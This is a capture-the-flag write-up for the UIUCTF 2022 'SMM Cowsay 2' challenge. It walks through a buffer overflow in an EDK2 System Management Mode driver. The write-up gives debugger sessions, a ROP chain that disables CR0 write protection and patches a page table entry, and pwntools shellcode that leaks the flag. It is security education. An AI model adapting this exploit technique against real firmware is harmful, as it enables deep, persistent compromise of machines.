# SMM Cowsay 2

**Author**: [@mebeim](https://twitter.com/mebeim) - **Full exploit**:
[expl_smm_cowasy_2.py][expl2]

**NOTE**: introductory info can be found in [the writeup for SMM Cowsay
1](https://ctftime.org/writeup/34881).

> We asked that engineer to fix the issue, but I think he may have left a  
> backdoor disguised as debugging code.

We are still in the exact same environment as before, but the code for the  
`SmmCowsay.efi` driver was changed. Additionally, we no longer have global RWX  
memory as the fifth EDK2 patch  
(`0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch`) now does not unlock page  
table entry permissions, but instead *explicitly sets the memory area
containing  
the flag as read-protected!*

```c  
 SmmSetMemoryAttributes (  
   0x44440000,  
   EFI_PAGES_TO_SIZE(1),  
   EFI_MEMORY_RP  
   );  
```

A hint is also given in the commit message:

```  
From: YiFei Zhu <[email protected]>  
Date: Mon, 28 Mar 2022 17:55:14 -0700  
Subject: [PATCH 5/8] PiSmmCpuDxeSmm: Protect flag addresses

So attacker must disable paging or overwrite page table entries  
(which would require disabling write protection in cr0... so, the  
latter is redundant to former)  
```

The first thing the [EDK2 SMI handler][edk2-smi-entry] does is set up a
4-level  
page table and enable 64-bit long mode, so SMM code runs in 64-bit mode with a  
page table.

The virtual addresses stored in the page table correspond 1:1 to physical  
addresses, so the page table itself is only used as a way to manage
permissions  
for different memory areas (for example, page table entries for pages that do  
not contain code will have the NX bit set). The flag page (`0x44440000`) was  
marked as "read-protect" which simply means that the corresponding page table  
entry will have the present bit clear, and thus any access will result in a
page  
fault.

## Vulnerability

Let's look at the updated code for `SmmCowsay.efi`. How is the communication  
handled now? We have a new `mDebugData` structure:

```c  
struct {  
 CHAR16 Message[200];  
 VOID EFIAPI (* volatile CowsayFunc)(IN CONST CHAR16 *Message, IN UINTN
MessageLen);  
 BOOLEAN volatile Icebp;  
 UINT64 volatile Canary;  
} mDebugData;  
```

This structure holds a `->CowsayFunc` function pointer, which is set when the  
driver is initialized:

```c  
mDebugData.CowsayFunc = Cowsay;  
```

The SMM handler code uses the `mDebugData` structure as follows upon receiving
a  
message:

```c  
EFI_STATUS  
EFIAPI  
SmmCowsayHandler (  
 IN EFI_HANDLE  DispatchHandle,  
 IN CONST VOID  *Context         OPTIONAL,  
 IN OUT VOID    *CommBuffer      OPTIONAL,  
 IN OUT UINTN   *CommBufferSize  OPTIONAL  
 )  
{  
 EFI_STATUS Status;  
 UINTN TempCommBufferSize;  
 UINT64 Canary;

 DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Enter\n"));

 if (!CommBuffer || !CommBufferSize)  
   return EFI_SUCCESS;

 TempCommBufferSize = *CommBufferSize;

 // ... irrelevant code ...

 Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer,
TempCommBufferSize);  
 if (EFI_ERROR(Status))  
   goto out;

 // ... irrelevant code ...

 SetMem(mDebugData.Message, sizeof(mDebugData.Message), 0);

 mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);

out:  
 DEBUG ((DEBUG_INFO, "SmmCowsay SmmCowsayHandler Exit\n"));

 return EFI_SUCCESS;  
}  
```

The problem is clear as day:

```c  
 Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer,
TempCommBufferSize);  
 if (EFI_ERROR(Status))  
   goto out;  
```

Here we have a memcpy-like function performing a copy from the `->Data` field
of  
the `EFI_SMM_COMMUNICATE_HEADER` (passed as `CommBuffer`) using the  
`->MessageLength` field as size (passed as `CommBufferSize`). The size is  
trusted and used as is, so any size above 400 will overflow the  
`CHAR16 Message[200]` field of `mDebugData` and corrupt the `CowsayFunc`  
function pointer, which is then called right away.

## Exploitation

The situation seems simple enough: send 400 bytes of garbage followed by an  
address and get RIP control inside System Management Mode. Once we have RIP  
control, we can build a ROP chain to either (A) disable paging altogether and  
read the flag, or (B) disable `CR0.WP` (since the page table is read only) and  
patch the page table entry for the flag to make it readable.

Method A was the author's solution. In fact there already is  
[a nice segment descriptor][edk2-gdt] for 32-bit protected mode in the SMM GDT  
that we could use for the code segment (`CS` register). However I went with  
method (B) because it seemed more straightforward. *Ok, honestly speaking I  
couldn't be bothered with figuring out how to correctly do the mode switch in  
terms of x86 assembly as I had never done it before, can you blame me? :')*

There is a bit of a problem in building a ROP chain though: after the `call`
to  
our address we lose control of the execution as we do not control the SMM
stack.  
It would be nice to simply overwrite the function pointer with the address of  
our shellcode buffer and execute arbitrary code in SMM, but as we already saw  
earlier, SMM cannot access that memory region, and this would just result in a  
crash.

### Finding ROP gadgets

**What can we access then?** It's clear that we'll need to ROP our way to  
victory. We can modify the `run.sh` script provided to run the challenge
locally  
in QEMU to capture EDK2 debug messages and write them to a file (we have a  
`handout/edk2debug.log` which was obtained in the same way from a sample run  
when building the challenge, but it's nice to have our own). Let's add the  
following arguments to the QEMU command line in `handout/run/run.sh`:

```  
-global isa-debugcon.iobase=0x402 -debugcon file:../../debug.log  
```

Now we can run the challenge and take a look at `debug.log`. Among the various  
debug messages, EDK2 prints the base address and the entry point of every
driver  
it loads:

```  
$ cd handout/run; ./run.sh; cd -  
$ cat debug.log | grep 'SMM driver'  
Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi  
Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi  
Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC159
PiSmmCpuDxeSmm.efi  
Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851
FvbServicesSmm.efi  
Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi  
Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE99E7 SmmCowsay.efi  
Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi  
Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E
SmmFaultTolerantWriteDxe.efi  
```

Surely enough, the `.text` section of all these drivers will contain code we
can  
execute in SMM. What ROP gadgets do we have?  
[Let's use `ROPGadget`][gh-ropgadget] to find them, using the base addresses  
provided by the EDK2 debug log:

```bash  
cd handout/edk2_artifacts  
ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 >> ../../gadgets.txt  
ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 >> ../../gadgets.txt  
# ... and so on ...  
```

Even though we have a lot of gadgets, we need multiple ones to build a useful  
ROP chain. After the `ret` from the first gadget, control will return back to  
`SmmCowsayHandler` if we do not somehow move the stack (RSP) to a controlled  
memory region, so the first gadget we need is one that is able to flip the
stack  
where we want.

There is [*a very nice gadget*][edk2-gadget] in EDK2 code:

```c  
// MdePkg/Library/BaseLib/X64/LongJump.nasm  
CetDone:

   mov     rbx, [rcx]  
   mov     rsp, [rcx + 8]  
   mov     rbp, [rcx + 0x10]  
   mov     rdi, [rcx + 0x18]  
   mov     rsi, [rcx + 0x20]  
   mov     r12, [rcx + 0x28]  
   mov     r13, [rcx + 0x30]  
   mov     r14, [rcx + 0x38]  
   mov     r15, [rcx + 0x40]  
// ...  
   jmp     qword [rcx + 0x48]  
```

Our function pointer will be called with `CommBuffer` as first argument (RCX),  
so jumping here would load a bunch of registers **including RSP** directly
from  
data we provide. This is very nice, and indeed the author's solution uses this  
to easily flip the stack and continue the ROP chain, but `ROPgadget` was not  
smart enough to find it for me, and I did not notice it when skimming through  
EDK2 source code while solving the challenge. *Too bad!* It would have  
definitely saved me some time :'). I will avoid using it and show how I  
originally solved the challenge to make things more interesting.

### Flipping the stack to controlled memory for a ROP chain

In any case, we still have a nice trick up our sleeve. See, it's true that we
do  
not control the SMM stack, but what if some of our registers got spilled on
the  
stack? With a gadget of the form `ret 0x123` or `add rsp, 0x123; ret` we would  
be able to move the stack pointer forward and use anything that we control on  
the SMM stack as another gadget. In order to check this we can attach a
debugger  
to QEMU and break at the call to `mDebugData.CowsayFunc()` in  
`SmmCowsayHandler()`.

We can enable debugging in QEMU by simply adding `-s` to the command line, and  
then attach to it from GDB. I wrote a simple Python GDB plugin to load debug  
symbols from the `.debug` files we have to make our life easier:

```python  
import gdb  
import os

class AddAllSymbols(gdb.Command):  
   def __init__ (self):  
       super (AddAllSymbols, self).__init__ ('add-all-symbols',  
           gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, True)

   def invoke(self, args, from_tty):  
       print('Adding symbols for all EFI drivers...')

       with open('debug.log', 'r') as f:  
           for line in f:  
               if line.startswith('Loading SMM driver at'):  
                   line = line.split()  
                   base = line[4]  
               elif line.startswith('Loading driver at') or line.startswith('Loading PEIM at'):  
                   line = line.split()  
                   base = line[3]  
               else:  
                   continue

               path = 'handout/edk2_artifacts/' + line[-1].replace('.efi', '.debug')  
               if os.path.isfile(path):  
                   gdb.execute('add-symbol-file ' + path + ' -readnow -o ' + base)

AddAllSymbols()  
```

The first part of the exploit is the same as for SMM Cowsay 1: get ahold of  
`BootServices->AllocatePool` and `->LocateProtocol`, find the
`SmmCommunication`  
protocol, allocate some memory to write our message, and send it to
`SmmCowsay`  
through its SMI handler. The only thing that changes is *what we are sending*:  
this time the `->Data` field of the `EFI_SMM_COMMUNICATE_HEADER` will be
filled  
with a string of 400 bytes of garbage plus 8 more to overwrite the function  
pointer.

We will fill all unused general purpose register with easily identifiable
values  
so that we can see what is spilled on the stack:

```python  
# ... same code as for SMM Cowsay 1 up to the allocation of `buffer`

input('Attach GDB now and press [ENTER] to continue...')

payload = 'A'.encode('utf-16-le') * 200 + p64(0x4141414141414141)

code = asm(f'''  
   /* Copy data into allocated buffer */  
   lea rsi, qword ptr [rip + data]  
   mov rdi, {buffer}  
   mov rcx, {0x18 + len(payload)}  
   cld  
   rep movsb

   /* Communicate(mSmmCommunication, buffer, NULL) */  
   mov rcx, {mSmmCommunication}  
   mov rdx, {buffer}  
   xor r8, r8  
   mov rax, {Communicate}

   mov ebx, 0x0b0b0b0b  
   mov esi, 0x01010101  
   mov edi, 0x02020202  
   mov ebp, 0x03030303  
   mov r9 , 0x09090909  
   mov r10, 0x10101010  
   mov r11, 0x11111111  
   mov r12, 0x12121212  
   mov r13, 0x13131313  
   mov r14, 0x14141414  
   mov r15, 0x15151515  
   call rax

   test rax, rax  
   jnz fail  
   ret

fail:  
   ud2

data:  
   .octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */  
   .quad {len(payload)}                   /* Buffer->MessageLength */  
   /* payload will be appended here to serve as Buffer->Data */  
''')

conn.sendline(code.hex().encode() + payload.hex().encode() + b'\ndone')  
conn.interactive() # Let's see what happens  
```

And now we can start the exploit and attach GDB using the following script:

```  
$ cat script.gdb  
target remote :1234

source gdb_plugin.py  
add-all-symbols

break *(SmmCowsayHandler + 0x302)  
continue  
```

```  
$ gdb -x script.gdb  
...  
Breakpoint 1, 0x0000000007ee92c5 in SmmCowsayHandler
(CommBufferSize=<optimized out>, CommBuffer=0x69bb030, ...  
(gdb) i r rax  
rax            0x4141414141414141  4702111234474983745

(gdb) si  
0x4141414141414141 in ?? ()

(gdb) x/100gx $rsp  
0x7fb6a78:      0x0000000007ee92c7      0x0000000007ffa8d8  
0x7fb6a88:      0x0000000007ff0bc5      0x00000000069bb030  
0x7fb6a98:      0x0000000007fb6c38      0x0000000007fb6b80  
...  
...  
...  
0x7fb6b48:      0x00000000069bb018      0x0000000013131300  
0x7fb6b58:      0x0000000014141414      0x0000000015151515  
```

It seems like R13 (except the LSB), R14 and R15 somehow got spilled on the
stack  
at `rsp + 0xe0`. After returning from the `call rax` the code in  
`SmmCowsayHandler` does:

```  
(gdb) x/30i SmmCowsayHandler + 0x302  
  0x7ee92c5 <SmmCowsayHandler+770>:     call   rax  
  0x7ee92c7 <SmmCowsayHandler+772>:     test   bl,bl  
  ... a bunch of useless stuff ...  
  0x7ee92f7 <SmmCowsayHandler+820>:     add    rsp,0x40  
  0x7ee92fb <SmmCowsayHandler+824>:     xor    eax,eax  
  0x7ee92fd <SmmCowsayHandler+826>:     pop    rbx  
  0x7ee92fe <SmmCowsayHandler+827>:     pop    rsi  
  0x7ee92ff <SmmCowsayHandler+828>:     pop    rdi  
  0x7ee9300 <SmmCowsayHandler+829>:     pop    r12  
  0x7ee9302 <SmmCowsayHandler+831>:     pop    r13  
  0x7ee9304 <SmmCowsayHandler+833>:     ret  
```

So at the time of that last `ret` we would have the registers spilled on the  
stack a lot closer. Very conveniently, amongst the gadgets we dumped, there is
a  
`ret 0x70` at `VariableSmm.efi + 0x8a49`. We can use this gadget to to move
RSP  
*exactly* on top of the spilled R14, giving us the possibility to execute one  
more gadget of the form `pop rsp; ret`, which would get the new value for RSP  
from the R15 value on the stack! After this, we fully control the stack and we  
can write a longer ROP chain.

### Writing the real ROP chain

After flipping the stack and starting the real ROP chain, we'll need gadgets  
for:

- Setting CR0 in order to be able to disable `CR0.WP` to be able to edit the  
 page table.  
- Write to memory at an arbitrary address to overwrite the page table entry for  
 the flag address.  
- Read from memory into a register to be able to get the flag.

All of these can be easily found with a bit of patience, since we have *a lot*  
of gadgets on our hands.

Since addresses don't change, we don't really need to worry about walking the  
page table: we can just find the address of the page table entry for  
`0x44440000` once using GDB and then hardcode it in the exploit:

```  
(gdb) set $lvl4_idx = (0x44440000 >> 12 + 9 + 9 + 9) & 0x1ff  
(gdb) set $lvl3_idx = (0x44440000 >> 12 + 9 + 9) & 0x1ff  
(gdb) set $lvl2_idx = (0x44440000 >> 12 + 9) & 0x1ff  
(gdb) set $lvl1_idx = (0x44440000 >> 12) & 0x1ff  
(gdb) set $lvl4_entry = *(unsigned long *)($cr3 + 8 * $lvl4_idx)  
(gdb) set $lvl3_entry = *(unsigned long *)(($lvl4_entry & 0xffffffff000) + 8 *
$lvl3_idx)  
(gdb) set $lvl2_entry = *(unsigned long *)(($lvl3_entry & 0xffffffff000) + 8 *
$lvl2_idx)

(gdb) set $lvl1_entry_addr = ($lvl2_entry & 0xffffffff000) + 8 * $lvl1_idx  
(gdb) set $lvl1_entry      = *(unsigned long *)$lvl1_entry_addr

(gdb) printf "PTE at 0x%lx, value = 0x%016lx\n", $lvl1_entry_addr, $lvl1_entry

PTE at 0x7ed0200, value = 0x8000000044440066  
```

Notice how `0x8000000044440066` has bit 63 set (NX) set and bits 0 and 1 unset  
(not present, not writeable). We need to set bit 0 in order to mark the page
as  
present, so the value we want is `0x8000000044440067`.

Checking the value of CR0 from GDB we get `0x80010033`: turning OFF the WP bit  
gives us `0x80000033`, so this is what we want to write into CR0 before trying  
to edit the page table entry at `0x7ed0200`.

After finding the gadgets we need, this is what the real ROP chain looks like:

```python  
ret_0x70 = 0x7F83000 + 0x8a49 # VariableSmm.efi + 0x8a49: ret 0x70  
payload  = 'A'.encode('utf-16-le') * 200 + p64(ret_0x70)

real_chain = [  
   # Unset CR0.WP  
   0x7f8a184 , # pop rax ; ret  
   0x80000033, # -> RAX  
   0x7fcf70d , # mov cr0, rax ; wbinvd ; ret

   # Set PTE of flag page as present  
   # PTE at 0x7ed0200, original value = 0x8000000044440066  
   0x7f8a184         , # pop rax ; ret  
   0x7ed0200         , # -> RAX  
   0x7fc123d         , # pop rdx ; ret  
   0x8000000044440067, # -> RDX  
   0x7fc9385         , # mov dword ptr [rax], edx ; xor eax, eax ;  
                       # pop rbx ; pop rbp ; pop r12 ; ret  
   0x1337, # filler  
   0x1337, # filler  
   0x1337, # filler

   # Read flag into RAX and then let everything chain  
   # crash to simply leak it from the register dump  
   0x7ee8222 , # pop rsi ; ret (do not mess up RAX with sub/add)  
   0x0       , # -> RSI  
   0x7fc123d , # pop rdx ; ret (do not mess up RAX with sub/add)  
   0x0       , # -> RDX  
   0x7ee82fe , # pop rdi ; ret  
   0x44440000, # -> RDI (flag address)  
   0x7ff7b2c , # mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret  
]  
```

### Putting it all together

We can now write the real ROP chain into our allocated buffer (let's say at  
`buffer + 0x800` just to be safe), load the gadget for flipping the stack into  
R14, the address of the new stack (i.e. `buffer + 0x800`) into R15, and go for  
the kill.

```python  
# Transform real ROP chain into .quad directives to  
# easyly embed it in the shellcode:  
#  
#   .quad 0x7f8a184  
#   .quad 0x80000033  
#    ...  
real_chain_size = len(real_chain) * 8  
real_chain      = '.quad ' + '\n.quad '.join(map(str, real_chain))

code = asm(f'''  
   /* Copy data into allocated buffer */  
   lea rsi, qword ptr [rip + data]  
   mov rdi, {buffer}  
   mov rcx, {0x18 + len(payload)}  
   cld  
   rep movsb

   /* Copy real ROP chain into buffer + 0x800 */  
   lea rsi, qword ptr [rip + real_chain]  
   mov rdi, {buffer + 0x800}  
   mov rcx, {real_chain_size}  
   cld  
   rep movsb

   /* Communicate(mSmmCommunication, buffer, NULL) */  
   mov rcx, {mSmmCommunication}  
   mov rdx, {buffer}  
   xor r8, r8  
   mov rax, {Communicate}

   /* These two regs will spill on SMI stack */  
   mov r14, 0x7fe5269         /* pop rsp; ret */  
   mov r15, {buffer + 0x800}  /* -> RSP */  
   call rax

   test rax, rax  
   jnz fail  
   ret

fail:  
   ud2

real_chain:  
   {real_chain}

data:  
   .octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */  
   .quad {len(payload)}                   /* Buffer->MessageLength */  
   /* payload will be appended here to serve as Buffer->Data */  
''')

conn.sendline(code.hex().encode() + payload.hex().encode() + b'\ndone')  
conn.interactive()  
```

Result:

```  
Running...  
!!!! X64 Exception Type - 0D(#GP - General Protection)  CPU Apic ID - 00000000
!!!!  
ExceptionData - 0000000000000000  
RIP  - AFAFAFAFAFAFAFAF, CS  - 0000000000000038, RFLAGS - 0000000000000002  
RAX  - 547B667463756975, RCX - 0000000000000000, RDX - 0000000000000000  
...  
```

Surely enough, that value in RAX decodes to `uiuctf{T`, which is the test flag  
provided in the `handout/run/region4` file. We could find some more gadgets to  
dump more bytes, and we could even try using IO ports to actually write the
flag  
out on the screen, but wrapping the exploit up into a function and running it
a  
couple more times seemed way easier to me (*I was also not sure about how to  
output to the screen, e.g. which function or which IO port to use*).

```python  
flag = ''  
for off in range(0, 0x100, 8):  
   chunk = expl(0x44440000 + off)  
   flag += chunk.decode()  
   log.success(flag)

   if '}' in flag:  
       break  
```

```  
[*] Leaking 8 bytes at 0x44440000...  
[+] uiuctf{d  
[*] Leaking 8 bytes at 0x44440008...  
[+] uiuctf{dont_try_  
...  
[*] Leaking 8 bytes at 0x44440030...  
[+] uiuctf{dont_try_this_at_home_I_mean_at_work_5dfbf3eb}  
```

[smm1]: #smm-cowsay-1  
[smm2]: #smm-cowsay-2  
[smm3]: #smm-cowsay-3  
[expl1]:
https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-
cowsay/expl_smm_cowasy_1.py  
[expl2]:
https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-
cowsay/expl_smm_cowasy_2.py  
[expl3]:
https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-
cowsay/expl_smm_cowasy_3.py

[tweet]:
https://twitter.com/MeBeiM/status/1554849894237609985  
[uiuctf]:                              https://ctftime.org/event/1600/  
[uiuctf-archive]:                      https://2022.uiuc.tf/challenges  
[author]:                              https://github.com/zhuyifei1999  
[wiki-smm]:
https://en.wikipedia.org/wiki/System_Management_Mode  
[intel-sdm]:
https://www.intel.com/content/www/us/en/developer/articles/technical/intel-
sdm.html  
[uefi-spec]:                           https://uefi.org/specifications  
[uefi-spec-pdf]:
https://uefi.org/sites/default/files/resources/UEFI_Spec_2_9_2021_03_18.pdf  
[man-cowsay]:                          https://manned.org/cowsay.1  
[man-pahole]:                          https://manned.org/pahole.1  
[x64-call]:                            https://docs.microsoft.com/en-
us/cpp/build/x64-calling-convention?view=msvc-170  
[x86-rsm]:                             https://www.felixcloutier.com/x86/rsm  
[x86-rdrand]:
https://www.felixcloutier.com/x86/rdrand  
[gh-pwntools]:                         https://github.com/Gallopsled/pwntools  
[gh-ropgadget]:
https://github.com/JonathanSalwan/ROPgadget  
[gh-edk2]:                             https://github.com/tianocore/edk2  
[gh-edk2-securityex]:                  https://github.com/jyao1/SecurityEx  
[gh-qemu]:                             https://github.com/qemu/qemu  
[qemu-memtxattrs]:
https://github.com/qemu/qemu/blob/v7.0.0/include/exec/memattrs.h#L35  
[edk2-SystemTable]:                    https://edk2-docs.gitbook.io/edk-ii-
uefi-driver-writer-s-guide/3_foundation/33_uefi_system_table  
[edk2-SmiHandlerRegister]:
https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdeModulePkg/Core/PiSmmCore/Smi.c#L213  
[edk2-EfiRuntimeServicesData]:
https://github.com/tianocore/edk2/blob/0ecdcb6142037dd1cdd08660a2349960bcf0270a/BaseTools/Source/C/Include/Common/UefiMultiPhase.h#L25  
[edk2-SmmCommunicationCommunicate]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L110  
[edk2-EFI_SMM_COMMUNICATION_PROTOCOL]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L267  
[edk2-copy-msg]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L547  
[edk2-smi-entry]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiEntry.nasm#L89  
[edk2-gadget]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/Library/BaseLib/X64/LongJump.nasm#L54  
[edk2-MdePkg]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec  
[edk2-buffer-check]:
https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdePkg/Library/SmmMemLib/SmmMemLib.c#L163  
[edk2-gdt]:
https://github.com/tianocore/edk2/blob/2812668bfc121ee792cf3302195176ef4a2ad0bc/UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiException.nasm#L31  

Original writeup
(https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/).